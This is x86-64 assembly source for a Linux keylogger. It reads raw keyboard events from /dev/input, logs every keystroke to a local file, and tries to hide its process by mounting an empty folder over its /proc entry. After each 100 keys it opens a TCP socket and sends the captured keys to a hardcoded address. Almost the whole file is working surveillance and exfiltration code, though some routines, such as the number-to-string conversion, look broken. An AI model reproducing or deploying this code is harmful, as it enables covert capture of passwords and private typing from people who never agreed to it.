section .text
  global _start

; _start is the entry point
_start:
  ; start by creating a fork and quit parent process to hide execution

  ;mov rax, 57
  ;syscall

  ;cmp rax, 0
  ;jne exit

  ; hiding process
  call hide_process

  ; create/open the key.log file to store the captured keys
  ; then store file descriptor into fd
  ; and check if all works correctly, if not jmp to error
  mov rax, 2
  mov rdi, file
  mov rsi, 00001102
  mov rdx, 422
  syscall

  mov [fd], rax

  test rax, rax
  js error

  ; open /dev/input/eventX to read all keys from input
  ; then store the file descriptor to sd
  ; and check if we can open it, if not jmp to error
  mov rax, 2
  mov rdi, source
  xor rsi, rsi
  syscall

  mov [sd], rax

  test rax, rax
  js error
  
    ; begin to read keys
  jmp read_keys

exit:
   mov rax, 60
   xor rdi, rdi
   syscall

error:
     mov rax, 1
     mov rdi, 1
     mov rsi, errorMsg
     mov rdx, errorMsgLen
     syscall

; find pid
; mount empty folder into /proc/pid file
hide_process:
  mov rax, 83
  mov rdi, mountPoint
  mov rdx, 422
  syscall

  mov rax, 39
  syscall

 ; mov rdi, [pid]
  ;mov rsi, 1234 
 ; call uitoa   ; Call the conversion function
  
  ;Append the PID to the process string
  mov rsi, pid  ; Source (PID string)
  mov rdi, process  ; Destination (process string)
  mov rcx, pro  ; Length of the PID string
  rep movsb         ; Copy the PID to the end of the process string

  mov rax, 165
  mov rsi, process
  mov rdi, mountPoint
  syscall

; uitoa
; convert in to a string
; inputs:
;    rsi: number to convert
;    rdi: string buf
; outputs:
;    - buf changed with the string value of the number 
uitoa:
    ; Input:
    ; rdi - Pointer to the destination buffer (where the ASCII string will be stored)
    ; rsi - Input unsigned 64-bit integer
    
    ; Initialize registers
    xor     rax, rax        ; Clear RAX to use it as a counter
    mov     rcx, 10         ; Load divisor 10 into RCX
    mov     rbx, rsi        ; Copy the input into RBX (we'll modify RBX)
    mov     rdx, rdi        ; Copy the destination pointer into RDX
    
.convert_loop:
    div     rcx             ; Divide RBX by 10, result in RAX (quotient), RBX (remainder)
    add     dl, '0'         ; Convert remainder to ASCII and store it in the destination buffer
    dec     rdx             ; Move the destination buffer pointer backward
    test    rbx, rbx        ; Check if RBX (quotient) is zero
    jnz     .convert_loop    ; If not zero, continue the loop
    
    ; Null-terminate the string
    mov     byte [rdx], 0   ; Null-terminate
    
    ; Return
    ret


read_keys:
  xor rax, rax
  mov rsi, event
  mov rdx, 24
  mov rdi, [sd]
  syscall

  mov byte al, [event + 16]
  cmp ax, 0x0
  je read_keys
  cmp ax, 0x4
  je read_keys

  mov byte al, [event + 18]
  cmp al, 42
  je .check_shift

  cmp al, 54
  je .check_shift

  mov byte al , [event + 20]
  cmp al, 0x0
  je read_keys

  mov byte al , [event + 18]
  cmp byte [mode], 1
  je  .upper_key
  jne  .lower_key

 .check_shift:
    mov byte al, [event + 20]
    cmp al, 0x1
    je .press_shift
    jne  .release_shift

 .press_shift:
    mov byte [mode], 1
    jmp read_keys

 .release_shift:
    mov byte [mode], 0
    jmp read_keys

 .upper_key:
    mov byte bl, [upperKeys + eax] 
    mov byte [key], bl

    jmp write_key

 .lower_key:
    mov byte bl, [lowerKeys + eax]
    mov byte [key], bl

    jmp write_key

write_key:
  mov rax, 1
  mov rdi, [fd]
  mov rsi, key
  mov rdx, 1
  syscall

  mov al, [counter]
  mov bl, [key]
  mov byte [keys + eax],bl 

  add byte [counter], 1
  cmp byte [counter], 100
  je send_keys

  jmp read_keys 

send_keys:
  mov rax, 41
  mov rdi, 0x2 
  mov rsi, 0x1
  xor rdx, rdx
  syscall
 
  mov [socket], rax

  mov rax, 42
  mov rdi, [socket]

  mov word [addr], 0x2 
  mov bx, [port]
  mov word [addr + 2], bx 
  mov ebx, [serv]
  mov dword [addr + 4], ebx 
 
  mov rsi, addr
  mov rdx, 16
  syscall

  mov rax, 1
  mov rdi, [socket]
  mov rsi, keys
  mov rdx, 100
  syscall

  mov rax, 3
  mov rdi, [socket]
  syscall

  mov byte [counter], 0
  jmp read_keys

section .data
  errorMsg db "must be run as root", 0xa
  errorMsgLen equ $ - errorMsg

  sourceStrt db "/dev/input/event", 0
  sourceEnd db "/device/capabilities/ev", 0
  sourceNmb db 0
  
  mountPoint db "/lost+found", 0
  process db "/proc/", 0

  source db "/dev/input/event3", 0

  sd dq 0

  file db "./key.log", 0
  fd dq 0

  pidStr db 8 
  pidLen equ $ - pidStr

  lowerKeys dw `??\&2\"\'(\-7\_90-=\b\tazertyuiop[]\n?qsdfghjklm,'\`?\wxcvbn,.:?*?\s?`
  upperKeys dw `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKLM,'\`?\WXCVBN?./?*?\s?`

  serv dd 0x0100007f
  port dw 0x3905

  socket dq 0

  mode db 0
  counter db 0

  const10 dq 10

section .bss
  event resb 24
  key resb 1
  keys resb 100
  addr resb 16
  pid resb 11
